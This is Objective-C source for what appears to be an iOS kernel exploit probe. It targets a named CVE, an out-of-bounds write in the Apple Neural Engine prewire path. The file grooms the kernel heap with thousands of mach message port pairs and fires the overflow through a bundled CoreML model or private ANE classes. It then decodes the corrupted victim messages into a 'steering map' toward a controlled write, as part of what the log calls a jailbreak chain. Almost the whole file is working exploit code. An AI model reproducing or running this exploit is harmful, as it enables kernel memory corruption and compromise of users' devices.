//
//  P099AnePrewireGroom.m — CVE-2026-43748 direct-path prewire OOB, groomed.
//  Recipe from the public vschko writeup; implementation is ours.
//  Bounded: 1 model, 1 evaluation, 2048 pairs, no loops.
//
//  MODEL PATH (cross-ref P046 PARK note "MIL _ANEModel CLOSED"): primary
//  loader is the bundled COMPILED espresso model (XVRC27_254in_1out_addchain
//  .mlmodelc) driven through CoreML's own ANE stack (P033-consistent).
//  The private _ANEModel MIL route is attempted only as a fallback and its
//  failure is expected per P046.
//
//  P046 pins (LabOff, 23F77): CheckandPrewire fffffff00874c070 fill_cap=0;
//  MemoryMap cmp fffffff00874c830 count_off=+0x810; ANE table=0x820
//  next-chunk=0xc0; n>=0xc1 reaches NEXT 3072 (0x3e0 past table end).
//  Fill order PROVED on F77: fill ALL records, THEN the +0x80 compare,
//  then IOFreeType (same-chunk smash freed with the map object).
//

#import "P099AnePrewireGroom.h"

#import <Foundation/Foundation.h>
#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <string.h>
#import <stdlib.h>
#import <fcntl.h>
#import <unistd.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <CoreFoundation/CoreFoundation.h>
#import "LabLocalTime.h"
#import "LabDeviceProfile.h"

#define P099_BUILD @"p099-aneprewire-v5-probeopen"

#define P099_INPUT_COUNT 254
#define P099_OUTPUT_COUNT 1
#define P099_MODEL_KEY @"XVRC27/mach_msg_min/model.anehash"
#define P099_DRAIN_COUNT 2048
#define P099_PAIR_COUNT 2048
#define P099_PAYLOAD_SIZE 0xb80
#define P099_SURF_BYTES 602112

#pragma mark - log helpers

static int g_p099_fd = -1;
static NSMutableString *g_p099_buf;

static void p099_flush_line(NSString *out) {
    if (g_p099_buf) [g_p099_buf appendString:out];
    if (g_p099_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_p099_fd, s, strlen(s));
            fcntl(g_p099_fd, F_FULLFSYNC);
        }
    }
}

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![line hasSuffix:@"\n"]) line = [line stringByAppendingString:@"\n"];
    @synchronized ([P099AnePrewireGroom class]) { p099_flush_line(line); }
}

#pragma mark - private ANE interfaces (fallback route only)

@interface P099_ANEModel : NSObject
+ (id)modelAtURLWithSourceURL:(id)modelURL sourceURL:(id)sourceURL
                            key:(id)key cacheURLIdentifier:(id)cacheURLIdentifier;
- (unsigned long long)programHandle;
@end

@interface P099_ANEClient : NSObject
+ (id)sharedConnection;
- (BOOL)compileModel:(id)model options:(id)options qos:(unsigned)qos error:(NSError **)error;
- (BOOL)doLoadModel:(id)model options:(id)options qos:(unsigned)qos error:(NSError **)error;
- (BOOL)doEvaluateDirectWithModel:(id)model options:(id)options request:(id)request
                              qos:(unsigned)qos error:(NSError **)error;
@end

@interface P099_ANEIOSurfaceObject : NSObject
+ (id)objectWithIOSurface:(void *)surface;
@end

@interface P099_ANERequest : NSObject
+ (id)requestWithInputs:(id)inputs inputIndices:(id)inputIndices
                outputs:(id)outputs outputIndices:(id)outputIndices
         procedureIndex:(id)procedureIndex;
- (BOOL)validate;
@end

#pragma mark - IOSurface (dlsym-only per AGENTS.md)

static void *(*p099_surf_create)(CFDictionaryRef);
static uint32_t (*p099_surf_getid)(void *);
static CFTypeRef (*p099_surf_lookup)(uint32_t);
static size_t (*p099_surf_allocsz)(void *);
static CFStringRef p099_key_w, p099_key_h, p099_key_bpe, p099_key_bpr, p099_key_alloc;

static BOOL p099_load_iosurface_syms(void) {
    void *f = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (!f) f = RTLD_DEFAULT;
    p099_surf_create = dlsym(f, "IOSurfaceCreate");
    p099_surf_getid = dlsym(f, "IOSurfaceGetID");
    p099_surf_lookup = dlsym(f, "IOSurfaceLookup");
    p099_surf_allocsz = dlsym(f, "IOSurfaceGetAllocSize");
    p099_key_w = dlsym(f, "kIOSurfaceWidth");
    p099_key_h = dlsym(f, "kIOSurfaceHeight");
    p099_key_bpe = dlsym(f, "kIOSurfaceBytesPerElement");
    p099_key_bpr = dlsym(f, "kIOSurfaceBytesPerRow");
    p099_key_alloc = dlsym(f, "kIOSurfaceAllocSize");
    return p099_surf_create && p099_key_alloc;
}

static void *p099_make_surface_for_idx(uint32_t idx) {
    NSDictionary *props = @{
        (__bridge id)p099_key_w: @(P099_SURF_BYTES / 4),
        (__bridge id)p099_key_h: @1,
        (__bridge id)p099_key_bpe: @4,
        (__bridge id)p099_key_bpr: @(P099_SURF_BYTES),
        (__bridge id)p099_key_alloc: @(P099_SURF_BYTES)
    };
    (void)idx;
    return p099_surf_create((__bridge CFDictionaryRef)props);
}

#pragma mark - mach message groom

typedef struct { mach_port_t hole; mach_port_t victim; } p099_pair_t;

typedef struct {
    mach_msg_header_t hdr;
    uint8_t bytes[P099_PAYLOAD_SIZE];
} p099_msg_t;

static void p099_fill_payload(uint8_t *p, uint32_t index, uint32_t role) {
    for (size_t i = 0; i < P099_PAYLOAD_SIZE; i++) {
        p[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^
                         (uint8_t)(role * 0x31u) ^ (uint8_t)(i * 13u));
    }
    uint64_t magic = role ? 0x56494354584C4D31ULL : 0x484F4C45584C4D31ULL;
    uint64_t marker = 0x4141414141414141ULL;
    uint64_t len = P099_PAYLOAD_SIZE;
    memcpy(p + 0x00, &magic, 8);
    memcpy(p + 0x08, &index, 4);
    memcpy(p + 0x0c, &role, 4);
    memcpy(p + 0x10, &len, 8);
    memcpy(p + 0x18, &marker, 8);
    /* v3 geomap: mark every 16B slot's tail half 0xEE (slots >= 0x20 so the
       header words at 0x00-0x1f survive). A record slot overwrites the tail
       with the marshal's fixed qword -> unmistakable in the decode. */
    for (size_t off = 0x20; off + 8 <= P099_PAYLOAD_SIZE; off += 16) {
        memset(p + off, 0xEE, 8);
    }
}

static mach_port_t p099_make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS) return 0;
    if (mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) return 0;
    return port;
}

/* INLINE messages on purpose: P044 found "fat type-3 OOL is the conversion
   neighbor" — OOL descriptors carry descriptor words the prewire smash
   would corrupt into descriptor tampering. Inline payloads are plain
   kalloc.3072 data: the OOB lands in payload bytes we can diff. */
static BOOL p099_send_msg(mach_port_t port, uint32_t index, uint32_t role) {
    p099_msg_t *msg = calloc(1, sizeof(p099_msg_t));
    if (!msg) return NO;
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(p099_msg_t);
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58590000u | ((role & 0xffu) << 8) | (index & 0xffu));
    p099_fill_payload(msg->bytes, index, role);
    kern_return_t kr = mach_msg(&msg->hdr, MACH_SEND_MSG, sizeof(p099_msg_t),
                                0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    free(msg);
    return kr == MACH_MSG_SUCCESS;
}

static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
    uint8_t rbuf[P099_PAYLOAD_SIZE + sizeof(mach_msg_header_t) + 0x400];
    p099_msg_t *msg = (p099_msg_t *)rbuf;
    memset(rbuf, 0, sizeof(rbuf));
    kern_return_t kr = mach_msg(&msg->hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                sizeof(rbuf), port, 1000, MACH_PORT_NULL);
    if (kr == MACH_MSG_SUCCESS && payloadOut) {
        if (msg->hdr.msgh_size < sizeof(mach_msg_header_t) + P099_PAYLOAD_SIZE) {
            return MACH_RCV_TOO_LARGE;
        }
        memcpy(payloadOut, msg->bytes, P099_PAYLOAD_SIZE);
    }
    return kr;
}

@implementation P099AnePrewireGroom

+ (NSString *)tap {
    @synchronized ([P099AnePrewireGroom class]) {
        g_p099_buf = [NSMutableString string];
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"p099_aneprewire_log.txt"];
        g_p099_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_APPEND, 0644);

        L(@"=== p099 session %@ BUILD %@ ===", LabLocalMilitaryNow() ?: @"?", P099_BUILD);
        L(@"CVE-2026-43748 ANE direct-path prewire OOB (0x80 table vs 0xff limit),");
        L(@"GROOMED: OOB lands in freed INLINE mach-msg victims, not gzalloc");
        L(@"metadata. The ungroomed shape is panic #1-#3 (wild write, x25 =");
        L(@"FAR-0xc00, stride 0xc0 = record 0xc0 crossing at +0xc00).");
        L(@"geomap (Ghidra fffffff00874c070): record = [sid u32][flags][000][tail],");
        L(@"tail in=0x0000000100000001 out=0x0000000200000001; flags = RECORD INDEX.");
        L(@"v3 tap PROVED: visible spill in a kmsg victim starts at record 195");
        L(@"(flag 0xc3) at body+0x0000; out record (254, tail {1,2}) at body+0x3b0;");
        L(@"records 192-194 land in the kmsg kernel-header region (not copied out).");
        L(@"P034 v2 pin: ANE object kdata = 0x820 (kalloc.3072, band 0x801-0xc00)");
        L(@"= 0x800 record area (128 slots) + metadata @0x800/0x810; records 128+");
        L(@"overrun element slack; record 192+ = NEXT element. Consume aim: A rec");
        L(@"192+k -> B object slot k; A out -> B slot 62 = B input 62 (127-in B).");
        L(@"v4 resolves record sids via IOSurfaceLookup (LIVE = our own staging).");
        {
            const LabOffTab *off = LabOff();
            L(@"P046 pins: fill_cap=%u on %s; late cmp at count_off +0x810;",
              off ? off->ane_fill_cap : 0u, (off && off->tag) ? off->tag : "?");
        }
        L(@"table 0x820, next-chunk 0xc0; n>=0xc1 reaches NEXT 3072.");
        L(@"One evaluation. STANDALONE ONLY - not in JAILBREAK chain.");
        L(@"Probe app: fire even on fill_cap / unknown SKU. Public Lum1na is the SKU gate.");
        L(@"%@", [LabDeviceProfile identBlock] ?: @"ident ?");
        if ([LabDeviceProfile aneFillCapped]) {
            L(@"EXPECT-BAD fill_cap=1. 254-in CheckandPrewire on this SKU -> 0xe00002c2. Probe still fires.");
        } else if (LabOff() && LabOff()->ane_table_size && LabOff()->ane_table_size != 0x820u) {
            L(@"EXPECT-BAD ane_table_size=0x%x (T8150 0x10b8, not A14 0x820). Probe still fires.",
              LabOff()->ane_table_size);
        } else if (!LabOff()) {
            L(@"EXPECT-BAD LabOff NULL (iPhone18,1/18,3 unknown). Probe still fires.");
        }

        NSBundle *b = [NSBundle mainBundle];

        // ---- groom state (built before evaluation, whichever path loads) ----

        // ---- groom state (built before evaluation, whichever path loads) ----
        __block p099_pair_t *pairs = calloc(P099_PAIR_COUNT, sizeof(p099_pair_t));
        __block mach_port_t *drain = calloc(P099_DRAIN_COUNT, sizeof(mach_port_t));
        BOOL groomReady = (pairs != NULL && drain != NULL);
        int drainOK = 0, pairOK = 0, holesFreed = 0;
        /* v3 geomap: sid -> request-position table for the record decode */
        uint32_t inSids[P099_INPUT_COUNT];
        uint32_t outSidCap = 0;
        memset(inSids, 0, sizeof(inSids));
        if (groomReady) {
            for (uint32_t i = 0; i < P099_DRAIN_COUNT; i++) {
                drain[i] = p099_make_port();
                if (drain[i] && p099_send_msg(drain[i], i, 2)) drainOK++;
            }
            for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
                pairs[i].hole = p099_make_port();
                pairs[i].victim = p099_make_port();
                if (pairs[i].hole && pairs[i].victim &&
                    p099_send_msg(pairs[i].hole, i, 0) &&
                    p099_send_msg(pairs[i].victim, i, 1)) pairOK++;
            }
            for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
                if (pairs[i].hole && p099_recv_payload(pairs[i].hole, NULL) == MACH_MSG_SUCCESS) holesFreed++;
            }
        }
        sync();
        L(@"[*] groom: drain=%d/%d pairs=%d/%d holes-freed=%d",
          drainOK, P099_DRAIN_COUNT, pairOK, P099_PAIR_COUNT, holesFreed);
        if (!groomReady) L(@"[!] groom alloc failed - continuing WITHOUT holes (higher panic risk)");

        // ---- PRIMARY: bundled compiled espresso model via CoreML (P033 path) ----
        BOOL evaluated = NO;
        // Lum1na bundles Resources/ane as an explicitFolder (bundle: ane/...);
        // the P007 lab app has it at bundle root. Try subdirectory first.
        NSURL *compiledURL = [b URLForResource:@"XVRC27_254in_1out_addchain"
                                 withExtension:@"mlmodelc"
                                  subdirectory:@"ane"];
        if (!compiledURL) {
            compiledURL = [b URLForResource:@"XVRC27_254in_1out_addchain"
                              withExtension:@"mlmodelc"];
        }
        if (compiledURL) {
            L(@"[*] PRIMARY model: %@ (compiled espresso; MIL _ANEModel is PARK-closed per P046)",
              compiledURL.lastPathComponent);
            NSError *err = nil;
            MLModelConfiguration *cfg = [MLModelConfiguration new];
            cfg.computeUnits = MLComputeUnitsAll;
            MLModel *model = [MLModel modelWithContentsOfURL:compiledURL
                                               configuration:cfg error:&err];
            if (model) {
                // 254 scalar inputs x_000..x_253, output y = sum.
                NSMutableDictionary<NSString *, MLFeatureValue *> *features =
                    [NSMutableDictionary dictionaryWithCapacity:P099_INPUT_COUNT];
                double expected = 0.0;
                BOOL featOK = YES;
                for (uint32_t i = 0; i < P099_INPUT_COUNT; i++) {
                    NSError *ferr = nil;
                    MLMultiArray *arr = [[MLMultiArray alloc] initWithShape:@[@1]
                                                                  dataType:MLMultiArrayDataTypeDouble
                                                                     error:&ferr];
                    if (!arr) { featOK = NO; break; }
                    double v = (double)(i + 1);
                    arr[0] = @(v);
                    expected += v;
                    features[[NSString stringWithFormat:@"x_%03u", i]] =
                        [MLFeatureValue featureValueWithMultiArray:arr];
                }
                if (featOK) {
                    MLDictionaryFeatureProvider *provider =
                        [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
                    if (provider) {
                        id<MLFeatureProvider> pred = [model predictionFromFeatures:provider error:&err];
                        if (pred) {
                            MLFeatureValue *yv = [pred featureValueForName:@"y"];
                            double got = yv.multiArrayValue ? yv.multiArrayValue[0].doubleValue : -1;
                            L(@"[*] inference ok y[0]=%.0f expected=%.0f", got, expected);
                        } else {
                            L(@"[-] prediction failed: %@ (model may not delegate to ANE on this SKU)",
                              err ? err.localizedDescription : @"?");
                        }
                        evaluated = YES;
                    } else {
                        L(@"[-] feature provider failed: %@", err.localizedDescription);
                    }
                } else {
                    L(@"[-] MLMultiArray create failed - honest miss.");
                }
            } else {
                L(@"[-] MLModel load failed: %@", err ? err.localizedDescription : @"?");
            }
        } else {
            L(@"[-] bundled XVRC27_254in_1out_addchain.mlmodelc missing from app bundle.");
        }

        // ---- SECONDARY: private _ANEModel MIL route (P046 says CLOSED; honest try) ----
        if (!evaluated) {
            if (!NSClassFromString(@"_ANEModel")) {
                dlopen("/System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine", RTLD_NOW | RTLD_GLOBAL);
            }
            Class modelCls = NSClassFromString(@"_ANEModel");
            Class clientCls = NSClassFromString(@"_ANEClient");
            Class surfCls = NSClassFromString(@"_ANEIOSurfaceObject");
            Class reqCls = NSClassFromString(@"_ANERequest");
            NSString *modelDir = [b pathForResource:@"model" ofType:nil inDirectory:@"ane"];
            if (!modelDir) modelDir = [b pathForResource:@"model" ofType:nil];
            BOOL modelFiles = modelDir &&
                [[NSFileManager defaultManager] fileExistsAtPath:
                  [modelDir stringByAppendingPathComponent:@"model.mil"]];
            if (modelCls && clientCls && surfCls && reqCls && modelFiles) {
                L(@"[*] SECONDARY: _ANEModel MIL route (expect CLOSED per P046 - honest try) ...");
                NSURL *modelURL = [NSURL fileURLWithPath:modelDir isDirectory:YES];
                NSDictionary *opts = @{
                    @"kANEFModelCacheIdentifierUsingSourceURLKey": @YES,
                    @"kANEFCompilationInitiatedByE5MLKey": @YES,
                    @"kANEFCompilerOptionsFilenameKey": @"options.plist",
                    @"kANEFModelType": @"kANEFModelMIL",
                    @"kANEFNetPlistFilenameKey": @"model.mil",
                };
                P099_ANEClient *client = [clientCls sharedConnection];
                P099_ANEModel *model = [modelCls modelAtURLWithSourceURL:modelURL
                                                               sourceURL:modelURL
                                                                     key:P099_MODEL_KEY
                                                      cacheURLIdentifier:nil];
                NSError *err = nil;
                BOOL ok = client && model && [client compileModel:model options:opts qos:2 error:&err];
                L(@"[*] MIL compile ok=%d err=%@", ok, err ? err.localizedDescription : @"-");
                if (ok) {
                    ok = [client doLoadModel:model options:opts qos:2 error:&err];
                    unsigned long long ph = [model programHandle];
                    L(@"[*] MIL load ok=%d programHandle=0x%llx", ok, ph);
                    if (ok && ph) {
                        NSMutableArray *inputs = [NSMutableArray arrayWithCapacity:P099_INPUT_COUNT];
                        NSMutableArray *inIdx = [NSMutableArray arrayWithCapacity:P099_INPUT_COUNT];
                        NSMutableArray *outputs = [NSMutableArray arrayWithCapacity:P099_OUTPUT_COUNT];
                        NSMutableArray *outIdx = [NSMutableArray arrayWithCapacity:P099_OUTPUT_COUNT];
                        for (uint32_t i = 0; i < P099_INPUT_COUNT; i++) {
                            void *s = p099_make_surface_for_idx(i);
                            if (!s) { ok = NO; break; }
                            inSids[i] = p099_surf_getid ? (uint32_t)p099_surf_getid(s) : 0u;
                            [inputs addObject:[surfCls objectWithIOSurface:s]];
                            [inIdx addObject:@(i)];
                        }
                        for (uint32_t i = 0; i < P099_OUTPUT_COUNT && ok; i++) {
                            void *s = p099_make_surface_for_idx(0xF0 + i);
                            if (!s) { ok = NO; break; }
                            outSidCap = p099_surf_getid ? (uint32_t)p099_surf_getid(s) : 0u;
                            [outputs addObject:[surfCls objectWithIOSurface:s]];
                            [outIdx addObject:@0];
                        }
                        if (!ok) {
                            L(@"[-] surface create failed in MIL route - honest miss.");
                        } else {
                        P099_ANERequest *req = [reqCls requestWithInputs:inputs inputIndices:inIdx
                                                                 outputs:outputs outputIndices:outIdx
                                                          procedureIndex:@0];
                        if (req) {
                            err = nil;
                            ok = [client doEvaluateDirectWithModel:model options:@{} request:req
                                                               qos:2 error:&err];
                            L(@"[*] MIL direct-path evaluate ok=%d err=%@",
                              ok, err ? err.localizedDescription : @"-");
                            evaluated = ok;
                        } else {
                            L(@"[-] requestWithInputs failed - honest miss.");
                        }
                    }
                }
                }
            } else {
                L(@"[-] MIL route unavailable (classes%@ modeldir%@) - P046 CLOSED confirmed.",
                  modelCls ? @"" : @" MISSING", modelFiles ? @"" : @" MISSING");
            }
        }

        if (!evaluated) {
            L(@"[-] no evaluation fired (both routes missed) - honest miss, no OOB, no panic.");
            L(@"=== VERDICT: NO FIRE ===");
            goto finish;
        }

        // ---- scan victims for prewire-record diffs ----
        {
            uint8_t expected[P099_PAYLOAD_SIZE];
            uint8_t actual[P099_PAYLOAD_SIZE];
            int hits = 0;
            int dumped = 0;
            for (uint32_t i = 0; i < P099_PAIR_COUNT && pairs && hits < 4; i++) {
                if (!pairs[i].victim) continue;
                kern_return_t rkr = p099_recv_payload(pairs[i].victim, actual);
                if (rkr != MACH_MSG_SUCCESS) continue;
                p099_fill_payload(expected, i, 1);
                if (memcmp(actual, expected, P099_PAYLOAD_SIZE) == 0) continue;
                size_t first = P099_PAYLOAD_SIZE;
                for (size_t j = 0; j < P099_PAYLOAD_SIZE; j++) {
                    if (actual[j] != expected[j]) { first = j; break; }
                }
                hits++;
                L(@"[+] HIT victim=%u first_diff=0x%04zx (record index ~0x%02zx)", i, first, first / 0x10);
                for (size_t off = first & ~(size_t)0xf;
                     off < ((first & ~(size_t)0xf) + 0x40) && off + 16 <= P099_PAYLOAD_SIZE; off += 16) {
                    NSString *hex = @"";
                    for (uint32_t k = 0; k < 16; k++) {
                        hex = [hex stringByAppendingFormat:@"%02x%s", actual[off + k], (k == 15) ? "" : " "];
                    }
                    L(@"[+]   %04zx: %@", off, hex);
                }
                /* v3 geomap: full-payload record decode, first two victims */
                if (dumped < 2) {
                    dumped++;
                    L(@"[geom] victim=%u FULL decode (0xb80 = 184 slots):", i);
                    int recN = 0, recIn = 0, recOut = 0;
                    size_t firstRec = 0, lastRec = 0;
                    for (size_t off = 0; off + 16 <= P099_PAYLOAD_SIZE; off += 16) {
                        if (actual[off + 5] | actual[off + 6] | actual[off + 7]) continue;
                        uint64_t tail; memcpy(&tail, actual + off + 8, 8);
                        if (tail == 0xEEEEEEEEEEEEEEEEULL) continue;
                        uint32_t sid; memcpy(&sid, actual + off, 4);
                        uint8_t fl = actual[off + 4];
                        NSString *kind = nil; int pos = -1;
                        if (outSidCap && sid == outSidCap) { kind = @"OUT"; recOut++; }
                        else {
                            for (uint32_t j = 0; j < P099_INPUT_COUNT; j++)
                                if (sid && inSids[j] == sid) { pos = (int)j; kind = @"in"; recIn++; break; }
                        }
                        if (!kind) kind = @"sid?";
                        if (!recN) firstRec = off;
                        lastRec = off;
                        recN++;
                        L(@"[geom]   +0x%04zx sid=%-10u flags=0x%02x tail=%016llx %@%@",
                          off, sid, fl, (unsigned long long)tail, kind,
                          pos >= 0 ? [NSString stringWithFormat:@" pos=%u", pos] : @"");
                    }
                    L(@"[geom] victim=%u records=%d (in=%d out=%d) span=0x%04zx..0x%04zx",
                      i, recN, recIn, recOut, firstRec, lastRec);
                    /* v4 sid-resolve: IOSurfaceLookup is task-scoped, so LIVE
                       = our own staging surfaces (sid->size completes the
                       sid->position map); null = freed or foreign. */
                    if (dumped == 1 && p099_surf_lookup) {
                        uint32_t uniq[64]; int nUniq = 0;
                        for (size_t off = 0; off + 16 <= P099_PAYLOAD_SIZE && nUniq < 64; off += 16) {
                            if (actual[off + 5] | actual[off + 6] | actual[off + 7]) continue;
                            uint64_t t2; memcpy(&t2, actual + off + 8, 8);
                            if (t2 == 0xEEEEEEEEEEEEEEEEULL) continue;
                            uint32_t s2; memcpy(&s2, actual + off, 4);
                            if (!s2) continue;
                            BOOL seen = NO;
                            for (int k = 0; k < nUniq; k++) if (uniq[k] == s2) { seen = YES; break; }
                            if (!seen) uniq[nUniq++] = s2;
                        }
                        L(@"[geom] sid-resolve (%d unique):", nUniq);
                        for (int k = 0; k < nUniq; k++) {
                            CFTypeRef o = p099_surf_lookup(uniq[k]);
                            if (!o) { L(@"[geom]   sid=%-10u freed/foreign", uniq[k]); continue; }
                            size_t asz = p099_surf_allocsz ? (size_t)p099_surf_allocsz((void *)o) : 0;
                            L(@"[geom]   sid=%-10u LIVE size=%zu", uniq[k], asz);
                            CFRelease(o);
                        }
                    }
                }
            }
            L(@"=== VERDICT ===");
            if (hits) {
                L(@"[+] CONTROLLED OOB CONFIRMED: %d victim payload(s) overwritten by prewire", hits);
                L(@"[+] records (surfaceId/symbolIndex/mapFlags/direction, 0x10/record).");
                L(@"[+] first_diff/0x10 = record index crossing into that chunk.");
                L(@"[+] Beta-1 write lane: shape the adjacent chunk with a known object");
                L(@"[+] and steer the corrupted field. Board stays HOLD until then.");
                L(@"[+] v3: the [geom] block above IS the steering map — paste it back.");
            } else {
                L(@"[-] no victim diffs: OOB missed groom (table landed elsewhere),");
                L(@"[-] ANE rejected the program, or evaluation failed above. Honest miss.");
            }
            L(@"[*] board untouched this probe (detection only).");
        }

finish:
        if (pairs) free(pairs);
        if (drain) free(drain);
        if (g_p099_fd >= 0) { close(g_p099_fd); g_p099_fd = -1; }
        NSString *out = [g_p099_buf copy];
        g_p099_buf = nil;
        return out;
    }
}

@end